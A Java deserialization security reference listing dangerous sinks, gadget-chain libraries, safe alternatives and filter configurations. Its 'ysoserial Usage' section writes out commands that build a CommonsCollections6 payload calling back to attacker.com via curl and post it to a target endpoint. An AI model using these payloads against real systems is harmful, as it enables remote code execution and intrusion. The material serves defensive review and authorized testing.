# Java Deserialization Reference — Sinks, Gadget Chains & Defenses

## Native Java Deserialization Sinks

| API | Risk | Notes |
|-----|------|-------|
| `ObjectInputStream.readObject()` | CRITICAL | Arbitrary class instantiation |
| `ObjectInputStream.readUnshared()` | CRITICAL | Same risk as readObject |
| `XMLDecoder.readObject()` | CRITICAL | Executes Java bytecode — treat as RCE |
| `ObjectInputStream` via `Serializable.readResolve()` | HIGH | Custom deserialization hook |
| `ObjectInputStream` via `readExternal()` | HIGH | `Externalizable` deserialization |

## XML / JSON Deserialization Sinks

| Library | Dangerous Config | Risk |
|---------|-----------------|------|
| XStream | No security framework applied | CRITICAL |
| XStream ≥ 1.4.20 | Default allowlist; custom types may whitelist too broadly | MEDIUM |
| Jackson `ObjectMapper` | `enableDefaultTyping()` or `@JsonTypeInfo(use=Id.CLASS)` | CRITICAL |
| Fastjson | `autoType` enabled (`ParserConfig.getGlobalInstance().setAutoTypeSupport(true)`) | CRITICAL |
| SnakeYAML | `new Yaml().load(userInput)` | CRITICAL — instantiates any class |
| Kryo | `kryo.readClassAndObject(input)` without registration | HIGH |
| Hessian | `HessianInput.readObject()` with no allowlist | CRITICAL |
| JBoss Marshalling | `MarshallerFactory.createUnmarshaller()` on untrusted input | CRITICAL |

## Gadget Chain Library Matrix

| Library | Version Range | Gadget Chain | Tool |
|---------|-------------|--------------|------|
| commons-collections | 3.0–3.2.1 | `InvokerTransformer` | ysoserial CC1–CC7 |
| commons-collections | 4.0 | `InvokerTransformer` (different path) | ysoserial CC2, CC4 |
| commons-beanutils | 1.9.2 | `BeanComparator` | ysoserial CB1 |
| groovy-all | 2.3.x | `ConversionHandler` | ysoserial Groovy1 |
| spring-core | 4.x | `MethodInvokeTypeProvider` | ysoserial Spring1, Spring2 |
| Xalan | 2.7.x | XSLT transform | ysoserial XALAN |
| ROME | 1.0 | `ToStringBean` | ysoserial ROME |
| Jython | 2.5.2 | `PyFunction` | ysoserial Jython1 |
| JRE (all) | ≤ 8u20 | `sun.reflect.annotation.AnnotationInvocationHandler` | ysoserial JRE8u20 |
| Hibernate | 5.x | `TypedValue` | ysoserial Hibernate1, Hibernate2 |

**Detection pattern:** grep `pom.xml` / `build.gradle` for these artifact IDs in vulnerable version ranges.

## ysoserial Usage (Reachability Confirmation)

```bash
# Generate payload for CommonsCollections6 (works without Java version dependency)
java -jar ysoserial.jar CommonsCollections6 "curl http://attacker.com/cc6-confirmed" > payload.ser

# Test against endpoint
curl -X POST http://target/api/legacy/import \
     -H "Content-Type: application/octet-stream" \
     --data-binary @payload.ser

# Blind confirmation (OOB)
# Watch for DNS/HTTP callback at attacker.com if direct response is blocked
```

## ObjectInputFilter Allowlist (Java 9+)

```java
// Application-level filter — allowlist by class name pattern
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "maxdepth=5;" +
    "maxarray=1000;" +
    "maxbytes=65536;" +
    "com.example.dto.**;" +  // allow your own DTOs
    "java.util.ArrayList;" +
    "java.lang.Number;" +
    "!*"                     // deny everything else
);

ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filter);
Object obj = ois.readObject();
```

**JVM-wide filter (Java 9+):**
```
# jvm.options / JAVA_TOOL_OPTIONS
-Djdk.serialFilter=maxdepth=5;maxarray=1000;com.example.**;!*
```

## Safe Serialization Alternatives

| Dangerous | Safe Alternative |
|-----------|-----------------|
| `ObjectInputStream` | Jackson JSON, Protobuf, Avro, Thrift |
| `XMLDecoder` | JAXB with hardened parser, Jackson XmlMapper |
| XStream (default) | Jackson, Gson |
| `Yaml.load()` | `Yaml.loadAs(input, SafeClass.class)` or SnakeYAML SafeConstructor |
| `ObjectMapper.enableDefaultTyping()` | Use concrete types; avoid polymorphic deserialization |

## SnakeYAML Safe Usage

```java
// DANGEROUS
new Yaml().load(userInput)  // can instantiate any class

// SAFE
Yaml yaml = new Yaml(new SafeConstructor(new LoaderOptions()));
MyDto dto = yaml.loadAs(userInput, MyDto.class);
```

## Jackson Polymorphic Typing Risks

```java
// DANGEROUS — global default typing
objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
objectMapper.activateDefaultTyping(LaissezFaireSubTypeValidator.instance, ObjectMapper.DefaultTyping.NON_FINAL);

// DANGEROUS — field-level annotation
@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS, include = As.PROPERTY, property = "@class")
Object data;

// SAFE — use explicit subtypes only
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = As.PROPERTY, property = "type")
@JsonSubTypes({
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
    @JsonSubTypes.Type(value = Cat.class, name = "cat")
})
abstract class Animal {}
```

## Deserialization Input Surfaces (Where to Look)

- HTTP request body with `Content-Type: application/x-java-serialized-object` or `application/octet-stream`
- Base64-encoded cookies (look for `rO0AB` prefix — Java serialization magic bytes in Base64)
- HTTP parameters decoded from Base64 that begin with `aced 0005` (hex magic bytes)
- JMX RMI endpoints, RMI registry lookups
- T3/T3S protocol (WebLogic), IIOP (JBoss/WebSphere), JMS messages
- Session objects stored in distributed cache (Redis, Memcached) if not using JSON
